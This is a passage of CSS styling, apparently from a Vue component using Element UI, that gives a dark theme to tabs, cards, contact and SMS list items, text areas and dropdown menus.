  .el-tabs >>> .el-tabs__header .el-tabs__item.is-active {
    background-color: #37465b;
    border-right-color: transparent;
    border-left-color: transparent;
  }
  .el-tabs >>> .el-tabs__header .el-tabs__item {
    color: rgba(255, 255, 255, 0.7);
  }
  .box-card {
    color: rgba(255, 255, 255, 0.7);
    background-color: #314052;
    border-color: hsla(0,0%,100%,.1);
    margin-top: 20px;
    max-width: 800px;
  }
  .box-card >>> .el-card__header {
    color:#fff;
    border-bottom-color: hsla(0,0%,100%,.1);
  }
  .box-card >>> div {
    user-select:text;
    padding: 10px 10px;
  }
  .box-card >>> .send-sms div {
    padding: 0;
  }
  .box-card >>> span.contact {
    user-select:text;
    width: 25%;
    display: inline-block;
  }
  .box-card >>> .el-card__body {
    max-height: 400px !important;
    overflow-y: auto;
  }
  .box-card.sms >>> .sms-item > span {
    display: block;
    padding:10px;
  }
  .box-card.sms >>> .sms-item:nth-child(2) {
    border-top: none;
  }
  .box-card.sms >>> .sms-item {
    border-top: 1px solid hsla(0,0%,100%,.1);
  }
  .el-textarea >>> textarea {
    background-color:#283443 !important;
    border: 1px solid hsla(0,0%,100%,.1) !important;
    color:#fff;
  }
  .el-textarea >>> textarea:hover {
    border-color: #c0c4cc !important;
  }

</style>
<style>
  .popper-bg {
    background-color: rgb(55, 70, 91) !important;
    border-color:  rgb(55, 70, 91) !important;
  }
  .popper-bg[x-placement^=top] .popper__arrow::after {
    border-top-color:  rgb(55, 70, 91) !important;
  }
  .popper-bg[x-placement^=top] .popper__arrow {
    border-top-color:  rgb(55, 70, 91) !important;
  }
  .el-upload-list__item-name {
    color: #409EFF !important;
  }
  .el-upload-list__item-name [class^=el-icon] {
    color: #409EFF !important;
  }
  .el-select-dropdown {
    position: absolute;
    z-index: 1001;
    border-radius: 4px;
    background-color:#222d3a !important;
    border: 1px solid hsla(0,0%,100%,.1) !important;
    -webkit-box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    box-shadow: 0 2px 12px 0 rgba(0,0,0,.1);
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    margin: 5px 0;
  }
  .el-select-dropdown li {
    color: #fff !important;
  }
  .el-select-dropdown li.hover, .el-select-dropdown li:hover {
    background-color: hsla(0,0%,100%,.05) !important;
  }
  .el-select-dropdown__item.hover, .el-select-dropdown__item:hover {
    background-color: #f5f7fa;
  }
  .el-select-dropdown.el-popper[x-placement^=bottom] .popper__arrow {
    border-bottom-color: hsla(0,0%,100%,.05) !important;
  }
  .el-select-dropdown.el-popper[x-placement^=bottom] .popper__arrow::after {
    border-bottom-color: #222d3a !important;
  }
</style>